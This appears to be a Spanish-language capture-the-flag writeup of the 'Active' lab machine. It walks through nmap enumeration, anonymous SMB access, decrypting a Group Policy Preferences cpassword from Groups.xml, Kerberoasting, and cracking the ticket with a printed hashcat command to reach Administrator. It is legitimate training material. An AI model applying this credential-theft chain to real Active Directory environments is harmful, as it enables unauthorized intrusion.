---
title: 'Easy Machine | Active'
description: 'Writeup de la maquina'
pubDate: 'Jul 13 2026'
heroImage: ''
tags: ['Kerberos', 'hashcat', 'nmap']
---
>Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment


```bash
PORT STATE SERVICE VERSION 
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) 
| dns-nsid:
|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-18 02:14:29Z) 
135/tcp open msrpc Microsoft Windows RPC 
139/tcp open netbios-ssn Microsoft Windows netbios-ssn 
445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

389/tcp open ldap 
445/tcp open microsoft-ds 
464/tcp open kpasswd5 
593/tcp open http-rpc-epmap
```

The scan revealed multiple services strongly indicative of a Domain Controller:

- **53** – DNS
- **88** – Kerberos
- **389 / 3268** – LDAP
- **445** – SMB
- **135 / 491xx** – RPC

Vemos el 445 abierto asi que enumeramos desde ahi
![enum](/ActtiveImg/enum.png)

Pudimos ingresar como Anonymous,

Asi que vamos a probar entrar como anonimo a Replication porque tenemos los permisos de lectura

![smb](/ActtiveImg/smb.png)

Vemos que hay un directorio active.htb, entramos y vamos a ver que hay en cad aun
![dir](/ActtiveImg/dir.png)
Viendo policies me encuentro con 
```bash
{31B2F340-016D-11D2-945F-00C04FB984F9} D 0 Sat Jul 21 07:37:44 2018 
{6AC1786C-016F-11D2-945F-00C04fB984F9} D 0 Sat Jul 21 07:37:44 2018
```

Que son carpetas de GPOs (Group Policy Objects)
Descargamos Groups.xml
![gpo](/ActtiveImg/gpo.png)

Y es una passowrd GPP 

![gpp](/ActtiveImg/gpp.png)
```bash
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS"
```

Vamos a ver la forma de desencriptarlo, encontramos una herramienta llamada gpp-decrypt https://github.com/t0thkr1s/gpp-decrypt

![decrypt](/ActtiveImg/decrypt.png)

Asi que entramos al share Users para buscar la flag de usuario en su Desktop

![smblfag](/ActtiveImg/sambaflag.png)

Es hora de hacer Kerberoasting! 
Tenemos credenciales validas y kerberos corriendo. Vamos a evaluar SPNs (**buscar cuentas de servicio que tengan un Service Principal Name** asignado).

![kerbo](/ActtiveImg/kerbo.png)

Tenemos un SPN acon admin

Vamos a desencriptarla con hashcat
```bash
hashcat -m 13100 -a 0 kerberoast.txt ~/herramientas/rockyou.txt
```
![hashcat](/ActtiveImg/hashcat.png)
Vamos a loguearnos con Administrator en el smbclient y obtenemos la root flag q tambien estaba en el Desktop
![root](/ActtiveImg/root.png)

